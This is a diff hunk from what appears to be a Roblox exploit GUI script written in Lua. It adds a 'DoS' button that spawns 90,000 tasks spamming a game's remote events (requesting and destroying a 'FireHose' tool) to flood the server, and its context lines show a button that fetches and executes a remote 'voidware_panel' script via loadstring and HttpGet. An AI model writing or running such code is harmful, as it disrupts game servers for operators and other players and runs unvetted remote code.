@@ -413,3 +413,35 @@ PromptRAdmin.TextSize = 5
 PromptRAdmin.MouseButton1Click:Connect(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/magnesiumv2/Administrator/refs/heads/main/voidware_panel.txt"))()
 end)
+
+local DoS = Instance.new("TextButton")
+DoS.Name = "DoS"
+DoS.Parent = JohnDoeFrame
+DoS.Position = UDim2.new(0, 0, 0, 0)
+DoS.Size = UDim2.new(0, 50, 0, 35)
+DoS.Text = "DoS"
+DoS.TextColor3 = Color3.fromRGB(255, 0, 0)
+DoS.TextSize = 5
+DoS.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
+DoS.MouseButton1Click:Connect(function()
+task.spawn(function()
+            for m = 1, 90000 do
+                task.spawn(function()
+                    if toolRemote:IsA("RemoteFunction") then
+                        toolRemote:InvokeServer("PickingTools", "FireHose")
+                    else
+                        toolRemote:FireServer("PickingTools", "FireHose")
+                    end
+                end)
+
+                local backpack = player:FindFirstChild("Backpack")
+                if backpack then
+                    local fireHose = backpack:FindFirstChild("FireHose")
+                    if fireHose and fireHose:FindFirstChild("ToolSound") then
+                        fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
+                    end
+                end
+                if m % 15 == 0 then task.wait(0.1) end
+            end
+        end)
+end)
